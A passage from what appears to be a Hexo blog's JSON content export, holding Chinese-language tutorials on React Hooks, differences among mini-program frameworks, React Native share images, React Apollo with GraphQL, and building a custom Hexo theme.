&#125;);&#125; 等效于以下的代码： 12345678910111213141516class Status extends Component &#123; // 注册订阅 componentDidMount() &#123; this._timer = setInterval(() =&gt; &#123; // ... &#125;, 1000 * 1); &#125; // 取消订阅 componentWillUnmount() &#123; clearInterval(this._timer); &#125; render() &#123; // ... &#125;&#125; 当在 effect hooks 里返回一个函数时，就会在组件卸载的时候会调用，等效于 class 的 componentWillUnmount 方法。 effect hooks 还允许跳过内容，从而优化性能。在 useEffect 的第二个参数里（为数组，可以填入多个），填入检测的状态值。 123456789101112function Example() &#123; const [count, setCount] = useState(0); // 如果 count 没有变化，则 useEffect 不会执行回调函数，尽管 Example 组件被对次渲染 useEffect(() =&gt; &#123; document.title = `You clicked $&#123;count&#125; times`; &#125;, [count]); // &lt;-- 这里 return ( &lt;div&gt;&lt;/div&gt; );&#125; 这段代码等效于： 12345componentDidUpdate(prevProps, prevState) &#123; if (prevState.count !== this.state.count) &#123; document.title = `You clicked $&#123;this.state.count&#125; times`; &#125;&#125; 是的 useEffect 帮你做了很多事情。也适用于 props。 1234567// 如果 Example 的 props.id 没有改变，则 useEffect 的回调函数是不会执行的function Example(&#123; id &#125;) &#123; useEffect(() =&gt; &#123; document.title = `You clicked $&#123;count&#125; times`; &#125;, [id]); // &lt;-- 这里 // ...&#125; useRef可以获取组件的 DOM 引用的 Hook。 123456789101112131415import &#123; useRef, useEffect &#125; from 'react';function MyComponent(&#123; imgUrl &#125;) &#123; const ref = useRef(null); useEffect(() =&gt; &#123; console.log(ref.src); &#125;); return ( &lt;div style=&#123;&#123; width: '100%', height: '100%' &#125;&#125;&gt; &lt;img ref=&#123;ref&#125; src=&#123;imgUrl&#125; /&gt; &lt;/div&gt; )&#125; useReducerReact 为我们提供了 useReducer，其用法类似 redux 中的 reducer。 123456789101112131415161718192021222324252627282930313233343536import React, &#123; useReducer &#125; from 'react';import &#123; Text, View, TouchableOpacity &#125; from 'react-native';const initialState = &#123; count: 0 &#125;;function reducer(state, action) &#123; switch (action.type) &#123; case 'reset': return initialState; case 'increment': return &#123; count: state.count + 1 &#125;; case 'decrement': return &#123; count: state.count - 1 &#125;; &#125; return state;&#125;export function DemoCounter(&#123; initialCount &#125;) &#123; const [state, dispatch] = useReducer(reducer, &#123; count: initialCount &#125;); return ( &lt;div&gt; &lt;p&gt;Count: &#123;state.count&#125;&lt;/p&gt; &lt;button onClick=&#123;e =&gt; dispatch(&#123; type: 'reset' &#125;)&#125;&gt; &lt;p&gt;Reset&lt;/p&gt; &lt;/button&gt; &lt;button onClick=&#123;e =&gt; dispatch(&#123; type: 'increment' &#125;)&#125;&gt; &lt;p&gt;+&lt;/p&gt; &lt;/button&gt; &lt;button onClick=&#123;e =&gt; dispatch(&#123; type: 'decrement' &#125;)&#125;&gt; &lt;p&gt;-&lt;/p&gt; &lt;/button&gt; &lt;/div&gt; );&#125; 自定义 HooksReact 为我们提供了几个基础的 Hook：useState、useEffect、useRef 等。在特定的场景里我们可能需要自定义自己的 Hook。那么改怎么自定义呢？ 自定义 Hook 需要做到：自定义 Hook 必须是一个 JavaScript 函数（不能是类），其名称需要以 use 开头，可以调用其他的 Hook，其本质就是通过 组合 基础的 Hook，实现一个自定义的 Hook。 123456789function usePeople(initState) &#123; const &#123; name, setName &#125; = useState(initState.name); const &#123; age, setAge &#125; = useState(initState.age); return [&#123; name, age &#125;, (data) =&gt; &#123; if (data.name) setName(data.name); if (data.age) setAge(data.age); &#125;];&#125; 这样就有了一个自定义的 Hook，这个 Hook 使用起来也非常简单。 123const [people, usePeople] = usePeople(&#123; name: 'xxx', age: 20 &#125;);usePeople(&#123; age: 21 &#125;); // --&gt; call useAge(21) 自定义 Hook 非常强大，它给你提供了无限的可能。例如使用 Hooks 结合 Redux，直接连接 Reducer。 1234567891011// 自定义了一个 reducer Hookfunction useReducer(reducer, initialState) &#123; const [state, setState] = useState(initialState); function dispatch(action) &#123; const nextState = reducer(state, action); setState(nextState); &#125; return [state, dispatch];&#125; 现在我们可以在我们的组件中使用它，让 reducer 驱动它的状态管理： 123456789101112131415161718192021function todosReducer(state, action) &#123; switch (action.type) &#123; case 'add': return [...state, &#123; text: action.text, completed: false &#125;]; // ... other actions ... default: return state; &#125;&#125;function Todos() &#123; const [todos, dispatch] = useReducer(todosReducer, []); function handleAddClick(text) &#123; dispatch(&#123; type: 'add', text &#125;); &#125; // ...&#125; 这样，也不需要使用 react-redux 来连接组件了，看起来非常方便，完美的与 redux 纯函数编程结合。 Hooks 规则在 Hooks 里有一定的规则限制： 只在函数的顶层使用 Hook。 不要在循环，条件或嵌套函数中调用 Hook。 只从 React Functions 调用 Hook。 不要在循环，条件或嵌套函数中调用 Hooks。相反，总是在 React 函数的顶层使用 Hooks。通过遵循此规则，您可以确保每次组件呈现时都以相同的顺序调用 Hooks。因为在 Hooks 内部的实现是自建 id 的。 只从 React Functions 调用 Hooks。不要从常规 JavaScript 函数中调用 Hook，只能从 React 函数组件调用 Hooks 或者从从自定义挂钩中调用挂钩。 优化技巧如果 useEffect useCallBack useMemo 等的第二个参数是 deps: DependencyList，会用于在执行期间进行判断，如果改变了则会调用里面的内容。 例如，只有 count 改变了才会执行 console.log，当然第一次初始化时也会执行。 123useEffect(() =&gt; &#123; console.log('www');&#125;, [count]); 如果想实现在初始化时执行一次，之后就不执行，那么可以这样写。 123useEffect(() =&gt; &#123; console.log('www');&#125;, []); 是的，给空了之后，无论怎么判断都是没有改变的。 参考资料 https://zhuanlan.zhihu.com/p/48642850?utm_source=wechat_session&amp;utm_medium=social https://medium.com/@ryardley/react-hooks-not-magic-just-arrays-cd4f1857236e","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"各大小程序之间的框架差异性分析","slug":"小程序/各大小程序之间的框架差异性分析","date":"2018-10-24T12:28:23.000Z","updated":"2021-06-15T06:10:52.913Z","comments":true,"path":"/stories/2018/10/小程序/各大小程序之间的框架差异性分析/","link":"","permalink":"http://me.lizhooh.com/stories/2018/10/小程序/各大小程序之间的框架差异性分析/","excerpt":"前言自从微信小程序推出之后，其他厂商也陆续的跟风推出自己的小程序框架，目前有微信小程序、支付宝小程序、百度小程序、今日头条小程序，据说之后还会有美团小程序等。 这么多小程序框架，开发起来也是参差不齐的，虽然说大家都参考你微信小程序，但是实际上会有很多的差异性，可谓是实力坑前端啊。下面就来看看，有哪些差异。","text":"前言自从微信小程序推出之后，其他厂商也陆续的跟风推出自己的小程序框架，目前有微信小程序、支付宝小程序、百度小程序、今日头条小程序，据说之后还会有美团小程序等。 这么多小程序框架，开发起来也是参差不齐的，虽然说大家都参考你微信小程序，但是实际上会有很多的差异性，可谓是实力坑前端啊。下面就来看看，有哪些差异。 小程序的差异点几大厂商的小程序框架不但内部的实现机制不同，在语法层面上也有很大的差异性，要做一个适配几大小程序的产品简直就是丧尽天良。 常见差异来看看最常规的差异性。 命名空间 微信小程序：wx 百度小程序：swan 支付小程序：my 快应用开发：无 if 指令 微信小程序：wx:if 百度小程序：s-if 支付小程序：a:if 快应用开发：if for 指令 微信小程序：wx:for、wx:for-index、wx:for-item 百度小程序：把 wx: 改成 s- 支付小程序：把 wx: 改成 a: 快应用开发：for=&quot;(personIndex, personItem) in list&quot; key 指令 微信小程序：wx:key 百度小程序：s-key 支付小程序：key 快应用开发：tid &lt;block&gt; 容器标签 微信小程序：存在 百度小程序：存在 支付小程序：存在 快应用开发：存在 事件绑定 微信小程序：bind/catch[事件名全小写]=&quot;回调名&quot; 百度小程序：bind/catch[事件名全小写]=&quot;回调名&quot; 支付小程序：on/catch[事件名驼峰]=&quot;回调名&quot; 快应用开发：on[事件名全小写]=&quot;回调名/回调(arguments)&quot; 插值是否支持函数 微信小程序：不支持 百度小程序：不支持 支付小程序：不支持 快应用开发：支持 模块中使用脚本 微信小程序：&lt;wxs /&gt; 百度小程序：&lt;filter /&gt; 支付小程序：&lt;import-sjs /&gt; 快应用开发：&lt;script /&gt; 模板文件后缀 微信小程序：.wxml 百度小程序：.swan 支付小程序：.axml 快应用开发：没有独立的文件，都放 template 中。 样式文件后缀 微信小程序：.wxss 百度小程序：.css 支付小程序：.acss 快应用开发：没有独立的文件，都放 style 中，不需要处理 less，sass。 template 包含 template 微信小程序：支持 百度小程序：不支持循环中使用 template 支付小程序：支持 快应用开发：未知 template 的 data 是否支持 …（解构） 微信小程序：...aaa 两个括号 百度小程序：...aaa 三个括号 支付小程序：...aaa 两个括号 快应用开发：只能一个个数据分开写 缺省的组件 微信小程序：未知 百度小程序：未知 支付小程序：moveable-view、cover-view、rich-text、functional-page-navigator、audio、video、camera、live-player、live-pusher。 快应用开发：未知 open-data 微信小程序：支持 百度小程序：支持 支付小程序：不支持 快应用开发：未知 样式单位 rpx 支持情况 微信小程序：支持 百度小程序：支持 支付小程序：支持 快应用开发：不支持 大小限制 微信小程序：4M 百度小程序：4M（分包 8M） 支付小程序：2M 快应用开发：1M（可以独单与厂商谈） 组件机制Component 构造器可用于定义组件，调用 Component 构造器时可以指定组件的属性、数据、方法等。 字段 说明 微信 支付宝 百度 轻应用 properties 接收的数据 同名 同名 同名 props data 内部数据 同名 同名 同名 private methods 方法集合 同名 同名 同名 不存在 created 组件创建时 同名 同名 同名 onInit attached 组件插入时 同名 同名 同名 不存在 ready 组件完成布局后 同名 同名 同名 onReady detached 组件移除时 同名 同名 同名 onDestroy 最后推荐使用 Taro 开发小程序，可以做到多端部署。 参考资料 https://rubylouvre.github.io/nanachi/documents/diff.html","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"React Native 生成分享图片文案","slug":"React Native/React Native 生成分享图片文案","date":"2018-10-13T11:06:25.000Z","updated":"2021-06-15T06:10:52.864Z","comments":true,"path":"/stories/2018/10/React Native/React Native 生成分享图片文案/","link":"","permalink":"http://me.lizhooh.com/stories/2018/10/React Native/React Native 生成分享图片文案/","excerpt":"前言在 React Native 里如何实现类似知乎哪样的图片分享文案呢？","text":"前言在 React Native 里如何实现类似知乎哪样的图片分享文案呢？ 微信分享微信分享跟着这篇文章走一遍即可：react-native-wechat（react-native 微信分享、支付) 需要注意的是，这篇文章的 API 参数，有点旧，具体根据 react-native-wechat 的文档为主。 另外有一个值得一提的地方，就是 react-native-wechat 与 react-native-fast-image 编译冲突的问题。如下图，查了很久大概是某些库直接存在重复依赖的问题。 最的解决方法是，去到 react-native-fast-image 的 build.gradle 里（在 node_module 里），把下面的 56 行注释掉。下图的版本是 v5.0.4。 具体，可能是一些 android.support 重复依赖问题。 二维码生成二维码生成，使用 react-native-qrcode，这是一个使用纯 Javascript 实现的二维码库，不需要链接原生的 Java 库。看了一下代码，二维码是使用 canvas 画出来的，而 canvas 是使用 WebView 的（哈哈）。 使用也非常简单， 12345678import QRCode from 'react-native-qrcode';&lt;QRCode value='http://facebook.github.io/react-native/' size=&#123;120&#125; bgColor='purple' fgColor='white'/&gt; 截图功能实际上像这种图片在 HTML5 里实现的方案是，使用 canvas 把效果画出来，在使用 canvas api 导出一张图片。而在 react-native 里则需要使用到一个截图库：react-native-view-shot react-native-view-shot 是一个原生的截图库，可以截取界面绘制的任何内容，也就是界面是什么样的，生成的图片也是什么样的。 使用也非常简单，只需要用一个 ViewShot 包裹你的界面组件代码即可。 12345678910import ViewShot from 'react-native-view-shot';&lt;ViewShot ref=&#123;r =&gt; this.viewshot = r&#125; options=&#123;&#123; format: 'jpg', quality: 0.9 &#125;&#125;&gt; &lt;Text&gt;...Something to rasterize...&lt;/Text&gt; &lt;Image soucre=&#123;&#123; uri: 'xxx' &#125;&#125; /&gt;&lt;/ViewShot&gt; 在点击分享的时候进行截图，并且分享到朋友对话里。 1234567891011121314this.viewshot.capture().then(uri =&gt; &#123; // 分享到朋友对话里，分享图片 return WeChat.shareToSession(&#123; type: 'imageFile', // &lt;-- 本地的图片 title: '分享标题', description: null, mediaTagName: null, messageAction: null, messageExt: null, imageUrl: uri, // file://xxxxx &#125;);&#125;).catch(err =&gt; &#123; Alert.alert('错误', err.message);&#125;);","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Apollo（GraphQL）使用指南","slug":"React/React/React Apollo（GraphQL）使用指南","date":"2018-10-11T13:38:36.000Z","updated":"2021-06-15T06:10:52.875Z","comments":true,"path":"/stories/2018/10/React/React/React Apollo（GraphQL）使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2018/10/React/React/React Apollo（GraphQL）使用指南/","excerpt":"前言React Apollo 是一个 Apollo 开源的一个 React + GraphQL 集成方案库，主要提供便利的 React 与 GraphQL 的封装函数使用。总的来说，以一种很方便以及简单的方式让 GraphQL 轻松的结合 React 来开发。 本文介绍 React Apollo 的使用指南，大部分内容以官方的文档翻译为主。","text":"前言React Apollo 是一个 Apollo 开源的一个 React + GraphQL 集成方案库，主要提供便利的 React 与 GraphQL 的封装函数使用。总的来说，以一种很方便以及简单的方式让 GraphQL 轻松的结合 React 来开发。 本文介绍 React Apollo 的使用指南，大部分内容以官方的文档翻译为主。 React ApolloReact Apollo 是什么？ React Apollo 就是被设计为使用 Apollo 和 React最简单的体验。 那么怎么开始？按照官方的文档，主要有几个部分： 安装依赖 基本认识 查询（Query） 突变（Mutation） 状态（State） 安装依赖使用 create-react-app 创建一个 react 项目后，安装这些依赖。 1yarn apollo-boost react-apollo graphql apollo-boost - 是一个 Apollo Client 套件。 react-apollo - graphql 集成库。 graphql - 用于解析 graphql 语法。 安装完这些依赖后就可以愉快的玩耍了。 基本认识在 React Apollo 里基本需要用到 Apollo-Client。Apollo-Client 是一个封装了 GraphQL 请求的网络库，看下面的使用。 12345678910111213import ApolloClient from 'apollo-boost';const client = new ApolloClient(&#123; uri: 'https://w5xlvm3vzz.lp.gql.zone/graphql'&#125;);client.query(&#123; query: gql`&#123; rates(currency: \"USD\") &#123; currency &#125; &#125;`&#125;).then(result =&gt; console.log(result)); ApolloClient 内部实际上是实现了 Ajax/fetch 等功能，我们只需要把 GraphQL 的字符串传递进去就可以查询了，非常方便。 但是一般情况下，不直接使用 ApolloClient，而是把 ApolloClient 的上下文连接到 React 的上下文里，就好像 React-Redux 的 Provider 一样。 1234567891011121314import React from 'react';import &#123; render &#125; from 'react-dom';import &#123; ApolloProvider &#125; from 'react-apollo';const App = () =&gt; ( &lt;ApolloProvider client=&#123;client&#125;&gt; &lt;div&gt; &lt;h2&gt;My first Apollo app 🚀&lt;/h2&gt; &lt;/div&gt; &lt;/ApolloProvider&gt;);render(&lt;App /&gt;, document.getElementById('root')); 连接之后有什么用呢，作用非常大，它可以自动的帮你调用 query 方法，从而实现一种响应式的方式。 下面的组件，一共会发送 3 种状态变化，一开始是 loading，接着数据列表渲染了，如果网络层错误就会显示 Error。 1234567891011121314151617181920212223import &#123; Query &#125; from 'react-apollo';import gql from 'graphql-tag';const ExchangeRates = () =&gt; ( &lt;Query query=&#123;gql`&#123; rates(currency: \"USD\") &#123; currency, rate &#125; &#125;`&#125;&gt; &#123;(&#123; loading, error, data &#125;) =&gt; &#123; if (loading) return &lt;p&gt;Loading...&lt;/p&gt;; if (error) return &lt;p&gt;Error :(&lt;/p&gt;; return data.rates.map((&#123; currency, rate &#125;) =&gt; ( &lt;div key=&#123;currency&#125;&gt; &lt;p&gt;&#123;`$&#123;currency&#125;: $&#123;rate&#125;`&#125;&lt;/p&gt; &lt;/div&gt; )); &#125;&#125; &lt;/Query&gt;); &lt;Query&gt; 是一个响应式组件，它会自动的帮你处理相关的生命周期以及 API 的调用，相当于直接把 GraphQL 映射到组件上，非常方便有木有。 查询（Query）以简单，可预测的方式获取数据是 Apollo Client 的核心功能之一。Query 组件是用于获取 GraphQL 数据并将结果附加到 UI 上，并且很容易跟踪错误和加载状态。 Query 组件该 Query 组件是 Apollo 应用程序最重要的构建块之一。要创建一个 Query 组件，只需传递一个包含该 gql 函数的 GraphQL 查询字符串：this.props.query，并在 this.props.children 里提供一个函数来 告诉 React 要呈现的内容。 123456789101112131415161718192021222324252627import gql from 'graphql-tag';import &#123; Query &#125; from 'react-apollo';const GET_DOGS = gql`&#123; dogs &#123; id, breed &#125;&#125;`;const Dogs = (&#123; onDogSelected &#125;) =&gt; ( &lt;Query query=&#123;GET_DOGS&#125;&gt; &#123;(&#123; loading, error, data &#125;) =&gt; &#123; if (loading) return 'Loading...'; if (error) return `Error! $&#123;error.message&#125;`; return ( &lt;select name='dog' onChange=&#123;onDogSelected&#125;&gt; &#123;data.dogs.map(dog =&gt; ( &lt;option key=&#123;dog.id&#125; value=&#123;dog.breed&#125;&gt; &#123;dog.breed&#125; &lt;/option&gt; ))&#125; &lt;/select&gt; ); &#125;&#125; &lt;/Query&gt;); 缓存数据Query 组件是带有缓存功能的。 当 Query 组件渲染时，Apollo Client 会为我们的查询创建一个 observable。Query 组件通过 Apollo Client 缓存订阅查询结果。 首先，尝试从 Apollo 缓存中加载查询结果。如果没有缓存，将请求发送到服务器。 数据恢复后，将其标准化并将其存储在 Apollo 缓存中。由于 Query 组件订阅了结果，因此它会自动更新数据。 查询参数当需要动态的查询参数时，可以指定一个属性：variables 用于注入查询参数。 12345678910111213const GET_DOG_PHOTO = gql` query Dog($breed: String!) &#123; dog(breed: $breed) &#123; id, displayImage &#125; &#125;`;const DogPhoto = (&#123; breed &#125;) =&gt; ( &lt;Query query=&#123;GET_DOG_PHOTO&#125; variables=&#123;&#123; breed &#125;&#125;&gt; ... &lt;/Query&gt;); 轮询查询轮询可以通过使查询在指定的时间间隔内重新获取来帮助我们实现接近实时的数据。要使用轮询，简单的加个 pollInterval 属性即可。 12345678910111213const DogPhoto = (&#123; breed &#125;) =&gt; ( &lt;Query query=&#123;GET_DOG_PHOTO&#125; variables=&#123;&#123; breed &#125;&#125; // 参数 pollInterval=&#123;500&#125; // 如果是 &lt;= 0，则不会进行 skip=&#123;!breed&#125; // 跳过内容 &gt; &#123;(&#123; loading, error, data, startPolling, stopPolling &#125;) =&gt; &#123; // ... startPolling 开始轮询 // ... stopPolling 结束轮询 &#125;&#125; &lt;/Query&gt;); 轮询是实现近实时数据的绝佳方式，而无需设置 GraphQL 订阅的复杂性。 重新查询如果要重新加载查询以响应用户操作，该怎么办？那就是简单的使用 refetch 函数。 123456789101112131415161718192021const DogPhoto = (&#123; breed &#125;) =&gt; ( &lt;Query query=&#123;GET_DOG_PHOTO&#125; variables=&#123;&#123; breed &#125;&#125; skip=&#123;!breed&#125;&gt; &#123;(&#123; loading, error, data, refetch &#125;) =&gt; &#123; if (loading) return null; if (error) return `Error!: $&#123;error&#125;`; return ( &lt;div&gt; &lt;img src=&#123;data.dog.displayImage&#125; style=&#123;&#123; height: 100, width: 100 &#125;&#125; /&gt; &lt;button onClick=&#123;() =&gt; refetch()&#125;&gt;Refetch!&lt;/button&gt; &lt;/div&gt; ); &#125;&#125; &lt;/Query&gt;); 加载状态如果点击刷新时，让用户看到正在刷新的情况，那么改怎么实现。有一个 networkStatus 可以让你细粒度的知道网络的变化。 123456(&#123; loading, error, data, refetch, networkStatus &#125;) =&gt; &#123; if (networkStatus === 4) return 'Refetching!'; if (loading) return null; if (error) return `Error!: $&#123;error&#125;`; // ...&#125;&#125; networkStatus 属性是一个枚举，其数字值为 1-8，表示不同的加载状态。 loading：以前从未运行过查询，请求现在处于暂挂状态。即使从缓存返回结果，查询仍将具有此网络状态，但无论如何都会调度查询。 setVariables：如果查询的变量发生更改并且网络请求被触发，则网络状态将 setVariables 一直持续到该查询的结果返回。当 options.variables 他们的查询发生变化时，react 用户会看到这一点。 fetchMore：表示 fetchMore 已在此查询上调用，并且创建的网络请求当前正在进行中。 refetch：这意味着 refetch 调用了一个查询，并且重新获取请求当前正在进行中。 Unused poll：表示轮询查询当前正在进行中。因此，例如，如果您每 10 秒轮询一次查询，则 poll 每当发送轮询请求但未解决时，网络状态将切换为每 10 秒。 ready：此查询没有请求正在进行中，并且没有发生错误，一切都好。 error：此查询没有正在进行的请求，但检测到一个或多个错误。 手动查询在默认情况下 Query 组件的查询是自动触发的，但是有时候并不想在渲染之后就触发，而是在特定的时机触发。 这时候就不能继续使用 Query 组件了，而是使用 ApolloConsumer 组件。 123456789101112131415161718192021222324252627282930import &#123; ApolloConsumer &#125; from 'react-apollo';class DelayedQuery extends Component &#123; state = &#123; dog: null &#125;; onDogFetched = dog =&gt; this.setState(() =&gt; (&#123; dog &#125;)); render() &#123; const &#123; dog &#125; = this.state; return ( &lt;ApolloConsumer&gt; &#123;client =&gt; ( &lt;div&gt; &#123;dog &amp;&amp; &lt;img src=&#123;dog.displayImage&#125; /&gt;&#125; &lt;button onClick=&#123;async () =&gt; &#123; const &#123; data &#125; = await client.query(&#123; query: GET_DOG_PHOTO, variables: &#123; breed: 'bulldog' &#125; &#125;); this.onDogFetched(data.dog); &#125;&#125; &gt; Click me! &lt;/button&gt; &lt;/div&gt; )&#125; &lt;/ApolloConsumer&gt; ); &#125;&#125; 以这种方式获取是非常冗长的，因此我们建议尽可能使用 Query 组件！ 参考资料 https://www.apollographql.com/docs/react/","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"从零开发属于自己的 Hexo 主题","slug":"前端/从零开发属于自己的 Hexo 主题","date":"2018-10-09T12:22:58.000Z","updated":"2021-06-15T06:10:52.906Z","comments":true,"path":"/stories/2018/10/前端/从零开发属于自己的 Hexo 主题/","link":"","permalink":"http://me.lizhooh.com/stories/2018/10/前端/从零开发属于自己的 Hexo 主题/","excerpt":"前言什么是 Hexo？Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 本文将会从零开始开发一个简单的博客主题。","text":"前言什么是 Hexo？Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 本文将会从零开始开发一个简单的博客主题。 安装首先，安装 hexo-cli，并创建一个项目。 1234567891011npm install -g hexo-cli# inithexo init blog# installcd blognpm install# runhexo server --debug 在创建完成后，会有一个初始化的项目文件，下面就在这个基础上开发自己的主题。 目录结构主题目录结构以自带的 landscape 主题为例，创建以下的目录用于描述主题，这个主题名称就叫 me 吧。 12345├── layout # 页面模板文件├── scripts # Hexo 脚本├── _config.yml # 主题的配置文件，可以配置一些变量├── README.md # 使用说明文件└── source # 主题资源文件，包括页面样式，脚本，字体等 一般主要集中编写 layout 和 source 两个内容。 其他的说明。 配置 LessHexo 默认的 css 预处理是 stylus，但是笔者不会 stylus，为了方便配个 less 吧，这里使用的是 hexo-renderer-less。 先安装： 1npm install hexo-renderer-less 在 me/_config.yml 里添加配置： 12less: compress: true 之后，在 source 里创建目录 css，以及文件 css/index.less，添加相应的 less 代码。在 source 目录里所有的文件都被视为资源，在编译时会编译在 public 目录下，并且会对部分后缀文件进行编译。 例如 source/css/index.less 编译后 -&gt; public/css/index.css。只要安装了对于的渲染器，hexo 就会自动识别 .less 的文件后缀名，选取相应的渲染器进行渲染，这部分都不需要我们去管理。 布局模板Hexo 是一个博客框架，也有一定的约束，因此页面大致会分为几类。 首页（index），对应的布局 index.jsx。 文章（post），对应的布局 post.jsx。 归档（archive），对应的布局 archive.jsx。 分类（category），对应的布局 category.jsx。 标签（tag），对应的布局 tag.jsx。 Hexo 默认是使用 ejs 的渲染引擎，我这里使用的 React 的渲染引擎。在 layout 中创建 index.jsx 文件，首页将会使用该布局模板生成 HTML 文件。 安装： 12yarn add hexo-renderer-react react react-domyarn add --dev babel-preset-es2015 babel-preset-react babel-preset-stage-0 接着在根目录下创建 .babelrc。 1234567&#123; \"presets\": [ \"es2015\", \"stage-0\", \"react\" ]&#125; 为了方便，添加一个通用的布局。 添加布局文件：me/layout/baseLayout.jsx。 12345678910111213141516171819202122232425262728293031import React from 'react';import Debug from './components/debug';import Navigate from './components/navigate';export default (Component) =&gt; (props) =&gt; &#123; const &#123; page, config, css, env, site &#125; = props; const View = Component; const title = page.title || config.title; return ( &lt;html&gt; &lt;head&gt; &lt;meta httpEquiv='content-type' content='text/html; charset=utf-8' /&gt; &lt;meta content='width=device-width, initial-scale=1.0' name='viewport' /&gt; &lt;title&gt;&#123;title&#125;&lt;/title&gt; &lt;div dangerouslySetInnerHTML=&#123;&#123; __html: css('css/index.css') &#125;&#125; /&gt; &lt;/head&gt; &lt;body&gt; &lt;Navigate list=&#123;site.data.menu&#125; /&gt; &lt;div className='main'&gt; &lt;View &#123;...props&#125; /&gt; &lt;/div&gt; &#123;env.debug &amp;&amp; env.env === 'development' &amp;&amp; &lt;Debug &#123;...props&#125; /&gt; &#125; &lt;/body&gt; &lt;/html&gt; );&#125; 接着在 me/layout/index.jsx 里添加主页代码。 123456import React from 'react';import layout from './baseLayout';export default layout((props) =&gt; ( &lt;h1&gt;Hello World&lt;/h1&gt;)) 这样，在打开主页后就是显示 Hello World 了。 还需要修改 hexo 的 _config.yml 中的 theme 字段，改为 me 注意事项：react 的渲染是服务端渲染，也就是使用 renderToString api 得出的 html，因此使用的 script 代码是无效的，其外文件后缀需要是 jsx。那么如何调试呢，你可以专门写一个组件用于输出当前的页面数据。 12345678910import React from 'react';export default (props) =&gt; ( &lt;script dangerouslySetInnerHTML=&#123;&#123; __html: ` var data = ($&#123;JSON.stringify(props)&#125;); console.log(data); ` &#125;&#125; /&gt;); 数据来源在 hexo 里，它相当于一个小型的后端服务，为你提供了很多页面的数据，在前端里可以直接使用这些数据进行渲染。 主要有全局变量以及当前页面的变量，在这里可以查看：https://hexo.io/zh-cn/docs/variables 现在来尝试输出一些变量来看看。 1const &#123; page, config, theme, site &#125; = this.props; 在了解了这些变量的内容后，我们就可以根据这些变量去渲染对应的内容。 全局变量 变量 描述 site 网站变量 page 针对该页面的内容以及 front-matter 所设定的变量。 config 网站配置 theme 主题配置。继承自网站配置。 _ (单下划线) Lodash 函数库 path 当前页面的路径（不含根路径） url 当前页面的完整网址 env 环境变量 网站变量 变量 描述 site.posts 所有文章 site.pages 所有分页 site.categories 所有分类 site.tags 所有标签 页面导航通常的主题都有一个页面的导航，因此在这里尝试添加一个简单的页面导航。导航的数据从 me/_config.yml 里获取。 往 me/_config.yml 里添加以下内容，作为导航的配置数据。 1234567891011121314151617# Headermenu: home: text: 主页 url: / archives: text: 归档 url: /archives tags: text: 标签 url: /tags categories: text: 分类 url: /categories about: text: 关于 url: /menu/about.html 接着在 layout 目录里添加一个 me/layout/components/navigate.jsx 目录，添加以下代码。 1234567891011121314import React from 'react';export default (&#123; theme &#125;) =&gt; ( &lt;div className=\"navigate\"&gt; &#123;Object.keys(theme.menu).map((key, index) =&gt; &#123; const item = theme.menu[key]; return ( &lt;a href=&#123;item.url&#125; key=&#123;index&#125; className=\"nav-item\"&gt; &#123;item.text&#125; &lt;/a&gt; ) &#125;)&#125; &lt;/div&gt;) 在 me/layout/index.jsx 里添加组件。 1&lt;Navigate theme=&#123;props.theme&#125; /&gt; 这时候，输出的 html 内容是： 1234567&lt;div class=\"navigate\"&gt; &lt;a href=\"/\" class=\"nav-item\"&gt;主页&lt;/a&gt; &lt;a href=\"/archives\" class=\"nav-item\"&gt;归档&lt;/a&gt; &lt;a href=\"/tags\" class=\"nav-item\"&gt;标签&lt;/a&gt; &lt;a href=\"/categories\" class=\"nav-item\"&gt;分类&lt;/a&gt; &lt;a href=\"/menu/about.html\" class=\"nav-item\"&gt;关于&lt;/a&gt;&lt;/div&gt; 接下来尝试优化一下样式，在 source/css/_navigate.less 里添加代码，并在 index.less 里引进来：@import &#39;./_navigate.less&#39;;。 12345678910111213141516171819202122232425@navigate-height: 50px;@navigate-color: #fff;@navigate-shadow: 1px 2px 10px rgba(1, 1, 1, 0.12);.navigate &#123; background-color: @navigate-color; box-shadow: @navigate-shadow; height: @navigate-height; display: flex; align-items: center; padding: 0 16px; &amp; &gt; .nav-item &#123; text-decoration: none; color: #333; padding: 0 16px; height: 100%; line-height: @navigate-height; &amp;:hover &#123; color: #f34; background-color: rgba(1, 1, 1, 0.03); &#125; &#125;&#125; 此外，这里需要在布局文件里引入 css，才能生效。 123&lt;head&gt; &lt;div dangerouslySetInnerHTML=&#123;&#123; __html: props.css('css/index.css') &#125;&#125; /&gt;&lt;/head&gt; 渲染出来的效果，之后基本都是前端美化的事情了。 文章页文章页使用的入口文件是 me/layout/post.jsx。渲染也比较简单，需要使用 dangerouslySetInnerHTML 差值插入 html 数据。 12345678910111213141516171819import React from 'react';import layout from './baseLayout';export default layout((&#123; page &#125;) =&gt; ( 